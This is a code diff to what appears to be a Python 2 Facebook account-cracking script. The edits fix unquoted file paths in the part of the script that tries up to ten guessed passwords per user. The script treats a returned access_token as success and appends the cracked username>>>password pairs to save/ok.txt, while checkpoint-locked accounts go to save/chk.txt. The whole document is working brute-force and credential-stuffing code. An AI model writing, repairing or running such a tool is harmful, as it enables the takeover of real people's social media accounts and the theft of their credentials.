@@ -142,13 +142,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass1 + '\n')
                 okb.close()
                 oks.append(c + user + pass1)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass1 + '\n'
-                cps = open(save/chk.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass1 + '\n')
                 cps.close()
                 cpb.append(c + user + pass1)
@@ -158,13 +158,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass2 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass2 + '\n')
                 okb.close()
                 oks.append(c + user + pass2)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass2 + '\n'
-                cps = open(save/chk.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass2 + '\n')
                 cps.close()
                 cpb.append(c + user + pass2)
@@ -174,13 +174,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass3 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass3 + '\n')
                 okb.close()
                 oks.append(c + user + pass3)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass3 + '\n'
-                cps = open(save/chk.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass3 + '\n')
                 cps.close()
                 cpb.append(c + user + pass3) 
@@ -190,13 +190,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass4 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass4 + '\n')
                 okb.close()
                 oks.append(c + user + pass4)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass4 + '\n'
-                cps = open(save/chk.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass4 + '\n')
                 cps.close()
                 cpb.append(c + user + pass4)
@@ -206,13 +206,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass5 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass5 + '\n')
                 okb.close()
                 oks.append(c + user + pass5)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass5 + '\n'
-                cps = open(save/ok.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass5 + '\n')
                 cps.close()
                 cpb.append(c + user + pass5)
@@ -222,13 +222,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass6 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass6 + '\n')
                 okb.close()
                 oks.append(c + user + pass6)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass6 + '\n'
-                cps = open(save/ok.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass6 + '\n')
                 cps.close()
                 cpb.append(c + user + pass6)
@@ -238,13 +238,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass7 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass7 + '\n')
                 okb.close()
                 oks.append(c + user + pass7)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass7 + '\n'
-                cps = open(save/ok.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass7 + '\n')
                 cps.close()
                 cpb.append(c + user + pass7)
@@ -254,13 +254,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass8 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass8 + '\n')
                 okb.close()
                 oks.append(c + user + pass8)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass8 + '\n'
-                cps = open(save/ok.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass8 + '\n')
                 cps.close()
                 cpb.append(c + user + pass8) 
@@ -270,13 +270,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass9 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass9 + '\n')
                 okb.close()
                 oks.append(c + user + pass9)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass9 + '\n'
-                cps = open(save/ok.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass9 + '\n')
                 cps.close()
                 cpb.append(c + user + pass9)
@@ -286,13 +286,13 @@ def action():
             q = json.load(data)
             if 'access_token' in q:
                 print '\x1b[1;92m[OK]\x1b[1;92m ' + k + c + user + ' >>> ' + pass10 + '\n' + '\n'
-                okb = open(save/ok.txt, 'a')
+                okb = open('save/ok.txt', 'a')
                 okb.write(k + c + user + '>>>' + pass10 + '\n')
                 okb.close()
                 oks.append(c + user + pass10)
             elif 'www.facebook.com' in q['error_msg']:
                 print '\x1b[1;91m[CHK]\x1b[1;91m ' + k + c + user + ' >>> ' + pass10 + '\n'
-                cps = open(save/ok.txt, 'a')
+                cps = open('save/chk.txt', 'a')
                 cps.write(k + c + user + '>>>' + pass10 + '\n')
                 cps.close()
                 cpb.append(c + user + pass10)
